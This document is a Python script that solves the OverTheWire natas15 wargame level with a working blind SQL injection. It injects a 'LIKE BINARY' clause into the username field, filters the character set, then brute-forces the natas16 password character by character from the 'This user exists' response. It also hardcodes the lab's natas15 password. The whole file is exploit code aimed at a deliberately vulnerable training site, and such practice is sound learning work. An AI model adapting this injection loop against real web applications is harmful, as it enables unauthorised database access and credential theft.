import requests

url = 'http://natas15.natas.labs.overthewire.org/'
uName = 'natas15'
password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'


charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

#filtering out unused chars increases speed
#Filtered set can have less than 32 chars but never more than 32.
#Chose a while loop to future proof script for a worst case : 32 distinct chars in filtered Set
#Need to limit i  because  of worst case :  password repeats the same char 32 times. Need to stop at end of charset.
filteredSet= ""
i =  0
while(not(len(filteredSet) >= 32) and i < len(charset)):
	inputPasswordSQL = "\" AND password LIKE BINARY \"%{}%\"#".format(charset[i])
	inputData = {'username':"natas16"+inputPasswordSQL}
	response = requests.post(url,data=inputData,auth=(uName,password))
	needle = response.text

	if(needle.count("This user exists")):
		filteredSet += charset[i]
	i += 1


currentIndex = 0
currentLetter = filteredSet[currentIndex]
currentPassword = ""
#Begin bruteforcing with filtered list.
#Remove 1st while loop if cannot determine charset used in the password

while (not(len(currentPassword) >= 32)):
	inputPasswordSQL = "\" AND password LIKE BINARY \"{}%\"#".format(currentLetter)
	inputData = {'username':"natas16"+inputPasswordSQL}
	response = requests.post(url,data=inputData,auth=(uName,password))
	needle = response.text[response.text.find("<div id=\"content\">")+20:response.text.find("<div id=\"viewsource\">")-5]

	if needle.count("This user exists"):
		currentPassword += currentLetter[-1:]
		print(currentPassword)
		currentIndex = 0
	else:
		currentIndex +=1
	currentLetter = currentPassword+filteredSet[currentIndex]
	#print("CI = ",currentIndex,"CL = ",currentLetter ,"CP = ", currentPassword)
print("-----------------------------------------------------------------------------")
